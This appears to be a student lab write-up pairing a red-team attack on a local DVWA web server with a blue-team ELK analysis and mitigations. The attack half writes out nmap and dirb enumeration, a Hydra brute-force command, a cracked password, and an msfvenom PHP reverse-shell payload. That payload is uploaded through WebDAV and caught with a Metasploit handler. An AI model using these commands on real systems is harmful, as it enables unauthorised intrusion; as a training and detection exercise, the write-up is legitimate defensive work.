# Red-Team vs Blue-Team Perspectives
Elk vs Kali: 


![Network Diagram Image](images/project2.svg)

| Hostname | Function | Network \ ip | Operating System
| -----------| --------- |---------        | ---------------------
|      Kali       | Attacker  | 192.168.1.90 | Linux 
|    DVWA    |  web-vm  | 192.168.1.105| Linux
|      ELK      | elk-server| 192.168.1.100| Linux 

-------------------------------------

# Goal of Experiment

1. Recon Capstone VM (DVWA) in a local environment
2. Attacking & Enumerations VM 
3. Blue Team Elk Analysis
4. Mitigation Strategies 

### Red Team Security Assessment
We will later detect all attacks from the blue team perspective and create baselines and thresholds for alerts based upon these attacks.

Jumping into an ACK scan to test the hosts firewall. 

	##### ACK scan to test the firewall
	> ip=192.168.1.105
	> nmap -sA $ip
	> 1000 scan results are unfiltered. 
	
	##### Performing very active port scan
	> nmap -sV -A $ip
	
	22/ ssh 
	80/ apache 2.24.29. The -A option automatically does everything, including traceroutes and maybe dns. We can see a few directories hosted on port 80. 
	
	# dirb
	> dirb $ip/company_folders
	
	results: 
	company_folders/secret_directory
	webdav/ 
	
##### Brute Force over http form 
	# Hydra attack a form over http 
	> hydra -l ashton -P /usr/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
	
> Hydra is unable to work with CSRF tokens.

Credentials allow access into the folder where instructions are left behind by the employees to access webdav. A user by the name of `ryan` and his md5 hash of a password located in /etc/passwd. Using john the rippper, this hash can be creacked `linux4u'. Entrance into the webdav exploit leads us to another vulnerability which will include direct upload access into the webdav folder. 

	# Dirb scan to find hidden folders within the hidden folder
	> dirb http://192.168.1.105/company_folders/secret_folder
	> dirb http://192.168.1.105/webdav 

##### Supported filetypes in php in the local shared webdav folder 
![Network Diagram Image](images/davfolder.png)

Since the folder allows drag and drop uploads of any file type including php, we are able to quickly upload a staged reverse shell. 
	
	`msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.1.90 LPORT=4444 > shell4.php`
	
	- no architecture need be specified: -a 
	- no encoding need be specified: -e 

##### Burp access. 
![msfpayload](images/Project_Images/Shells/msfburppayload.png)

The other ways of obtaining a shell is to use burpsuite. 

	# use options to view allowed options within repeater
	GET /webdav/ HTTP1.1 
	OPTIONS /webdav/ HTTP/1.1 
	
	ALLOWs: GET, POST, DELETE, PROPFIND, MOVE, PUT, LOCK, UNLOCK
	
- using the PUT method. 
- After authorization and additional header will be added: Authorization: Basic cnlbijsaW51eDRI

![upload_complete](images/Project_Images/Shells/upload_complete.png)

	# msfconsole
	> use exploit/multi/handler
	> set lhost, lport 
	> run 
	
	# Change PUT back to GET in burp
	> GET /webdav/shell5.php HTTP/1.1 
	
	>Meterpreter
	>sysinfo 
	Computer : Server1
	OS       : Linux server1 4.15.0-108-generic 
	
	> getpid
	Current pid: 1365
	
-------------

## Blue Team Assessment

##### Identifying the Port Scan @01:07:40.004
	> source.ip: 192.168.1.90 and destination.ip: 192.168.1.105 
	
![syn-scan](images/Project_Images/Nmap-Scan/portscan_1.png)

	- 916.424 total occurrances
	
	add > and network.packets: 2
	
this filtering will show the entirety of the nmap -sC -sV scan. 
A stealthy scan or -T1 command will show up differently than a full tcp scan, therefore custom alerts will have to be made for varying timeframes, e.g. hourly, daily. 

An alert can be made by querying out network `packets: 2` as default nmap SYN scans. 


##### Finding the Request for the Hidden Directory @01:50.14
![dir](images/Project_Images/secret-folder/access-to-folders.png)

	# Secret Folder accessed 51038 times due to dirb and ffuf  
	> source.ip: 192.168.1.90 and destination.ip: 192.168.1.105 and url.path: /company_folders/secret_folder/*
	
- Aside from the hydra http-get attack also, some human written forensic information was uncovered after  finding `ryans hash`, which was found to be `linux4u` and the location

- This alert triggers for new hosts connected and hosts not approved & pre-configured. 

##### Uncovering the Brute Force Attack @01:48:47.748
![hydra](images/Project_Images/Hydra/day3/onlyhydrahost.png)

#### Search for this brute force attack

> user_agent.original: "Mozilla/4.0 (Hydra)"
![hydra-hosts](images/day_5/day_6/bruteforce_search_by_hostname.png)

> This hydra attack does not mask locations or hostnames and is easy to tell from all the ERROR status. 

###### This Hydra attack occurs very fast and is not a stealthy attack with a baseline of over 200 requests per second and 11000 per minute
![hydra-baseline](images/day_5/day_6/brute_force_baselines.png)

##### Finding the WebDAV Connection @02:31:29.518
![webdav](images/Project_Images/webdav/day3/not-good.png)

#### Total Number of WebDAV Connections
![webdav-dash](images/day_5/day_6/webdav_dash.png)

- 616 requests were made to this directory alone
- Files requested were shells in php format.
###### Alarms: 
- Set for ip addresses called to as the foreign destination address
- Format php execution alarm & create no execution policy for the webdav user. 

> Mitigating this attack would be to configure access in the webDav for Administrative access to upload files via PUT request and also not allow the forgery of the filetype.

- After this migitation payloads may need to be encoded and named in different formats. It is HTTP/1.1 with no anti-virus within this shared folder.

# Mitigation Strategies 

##### Blocking the Port Scan 
Port scans occur within seconds and enumeration stage level should be alerted within.
one way to block the syn-scan is to block request not sending the fyn access to establish their connection to the server. Same for the full tcp connect across all ports. 

- nmap would result in closed or filtered. 
- Detecting stealth scans kernel-level work

##### blocking icmp ping sweeps 
Block icmp ping sweeps from detecting and accepting the configuration of allowed hosts and syn-scans doing these. Mitigations would be to block sessions or ip's that are not completing the full TCP handshake. 

	# Types of port scans that would require different alarms. 
	- Ping scans
	- Ack scans XMAS 
	- location bounce
	- sweep scan 

##### Detecting the WebDAV Connection 
	- LAN access only on differing levels. 
	
	- Substring searches in the fileshare that contain WebDAV related keywords.
	
	- Changing the webdav directory name > dav://192.168.1.90/______ so dirb cannot find it within its default wordlist (This is not a solution but a means of obsurity). 
	
	- LAN static configuratiions and checks on the filesystems, making sure mac address remain the same.
	
##### Reverse Upload Shells 
	- Disallow php files that can be read by apache. 
	- Create Alerts for Filesizes
	- Alert For CPU usage
	

	
	
	







